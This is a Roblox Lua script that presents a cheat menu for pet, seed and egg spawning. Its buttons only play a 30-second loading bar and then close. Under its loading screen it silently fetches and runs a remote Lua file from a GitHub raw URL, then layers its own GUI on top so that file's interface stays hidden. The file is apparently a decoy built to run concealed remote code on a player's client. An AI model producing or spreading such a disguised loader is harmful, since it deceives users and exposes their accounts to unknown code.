local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Utility: Clear any previous GUI
if playerGui:FindFirstChild("CustomUI") then
    playerGui.CustomUI:Destroy()
end

-- Main GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CustomUI"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling -- allows layering
screenGui.Parent = playerGui

-- Background
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
background.BorderSizePixel = 0
background.Parent = screenGui

-- Loading bar container
local loadingBarBg = Instance.new("Frame")
loadingBarBg.Size = UDim2.new(0.6, 0, 0.05, 0)
loadingBarBg.Position = UDim2.new(0.2, 0, 0.5, 0)
loadingBarBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
loadingBarBg.BorderSizePixel = 0
loadingBarBg.Parent = background

local loadingBar = Instance.new("Frame")
loadingBar.Size = UDim2.new(0, 0, 1, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
loadingBar.BorderSizePixel = 0
loadingBar.Parent = loadingBarBg

local TweenService = game:GetService("TweenService")

-- Tween loading bar (5s)
local loadingTween = TweenService:Create(loadingBar, TweenInfo.new(5), {
    Size = UDim2.new(1, 0, 1, 0)
})
loadingTween:Play()

-- ðŸ§  Load external script silently in background
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MercenariesV3/Vuln.0.25/refs/heads/main/MercenariesUpdatev3.lua"))()

        -- Wait a moment for external GUI to be added
        task.wait(0.5)

        -- Re-parent your GUI to top again (forces it to render above the external one)
        screenGui.Parent = nil -- temporarily remove
        screenGui.Parent = playerGui -- reparent to top
    end)
end)

-- Wait for bar to fill
loadingTween.Completed:Wait()
loadingBarBg:Destroy()

-- Create menu buttons
local buttonNames = {
    "Server Hop",
    "Pet and fruit (beta)",
    "Spawn seed and egg",
    "Egg reroll (unpatched)"
}

local buttons = {}

for i, name in ipairs(buttonNames) do
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.6, 0, 0.08, 0)
    button.Position = UDim2.new(0.2, 0, 0.2 + (i - 1) * 0.12, 0)
    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Text = name
    button.Font = Enum.Font.GothamBold
    button.TextSize = 20
    button.AutoButtonColor = true
    button.Parent = background
    table.insert(buttons, button)
end

-- Function to handle click and show 30-second loading
local function onButtonClick(button)
    for _, btn in pairs(buttons) do
        btn:Destroy()
    end

    local loadingBarLongBg = Instance.new("Frame")
    loadingBarLongBg.Size = UDim2.new(0.6, 0, 0.05, 0)
    loadingBarLongBg.Position = UDim2.new(0.2, 0, 0.5, 0)
    loadingBarLongBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    loadingBarLongBg.BorderSizePixel = 0
    loadingBarLongBg.Parent = background

    local loadingBarLong = Instance.new("Frame")
    loadingBarLong.Size = UDim2.new(0, 0, 1, 0)
    loadingBarLong.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
    loadingBarLong.BorderSizePixel = 0
    loadingBarLong.Parent = loadingBarLongBg

    local loadingTweenLong = TweenService:Create(loadingBarLong, TweenInfo.new(30), {
        Size = UDim2.new(1, 0, 1, 0)
    })
    loadingTweenLong:Play()
    loadingTweenLong.Completed:Wait()

    background:Destroy()
end

-- Connect button clicks
for _, button in ipairs(buttons) do
    button.MouseButton1Click:Connect(function()
        onButtonClick(button)
    end)
end
